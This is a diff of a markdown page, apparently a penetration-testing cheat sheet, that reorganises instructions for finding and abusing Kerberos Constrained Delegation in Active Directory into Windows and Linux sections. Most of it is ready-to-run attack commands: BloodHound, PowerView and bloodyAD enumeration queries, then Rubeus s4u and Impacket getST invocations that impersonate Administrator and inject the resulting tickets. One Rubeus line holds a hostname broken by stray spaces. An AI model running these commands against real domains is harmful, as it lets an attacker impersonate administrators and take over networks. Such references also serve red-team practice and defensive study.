@@ -2,29 +2,53 @@
 
 > Kerberos Constrained Delegation (KCD) is a security feature in Microsoft's Active Directory (AD) that allows a service to impersonate a user or another service in order to access resources on behalf of that user or service.
 
-## Identify a Constrained Delegation
+## From Windows
 
-* BloodHound: `MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p`
-* PowerView: `Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft`
-* Native
+### Identify a Constrained Delegation
 
+* **Bloodhound**  
+  BloodHound: `MATCH p = (a)-[:AllowedToDelegate]->(c:Computer) RETURN p`
+
+* **PowerView**  
+  ```powershell
+  Get-NetComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto | ft
+  ```
+
+* **Native Powershell**  
   ```powershell
   Get-DomainComputer -TrustedToAuth | select -exp dnshostname
   Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
   ```
 
-* bloodyAD:
+### Exploit the Constrained Delegation
 
-  ```ps1
+* **Rubeus**  
+  ```powershell
+  # With a password
+  Rubeus.exe s4u /nowrap /msdsspn:<time/target.local> /altservice:cifs /impersonateuser:"administrator" /domain:<domain> /user:<user> /password:<password>
+
+  # with a NT Hash
+  Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.c    om /altservice:cifs /ptt
+  #Example
+  Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
+  ```
+
+## From Linux
+
+### Identify a Constrained Delegation
+
+* **bloodyAD:**  
+
+  ```bash
   bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))' --attr sAMAccountName,msds-allowedtodelegateto
   ```
 
-## Exploit the Constrained Delegation
+### Exploit the Constrained Delegation
 
 * Impacket
 
-  ```ps1
-  getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
+  ```bash
+  Impacket-getST -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
   ```
 
 * Rubeus: S4U2 attack (S4U2self + S4U2proxy)
@@ -63,7 +87,7 @@
   Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /user:win10x64$ /aes256:4b55f...fd82 /ptt
   ```
 
-## Impersonate a domain user on a resource
+### Impersonate a domain user on a resource
 
 Require:
 
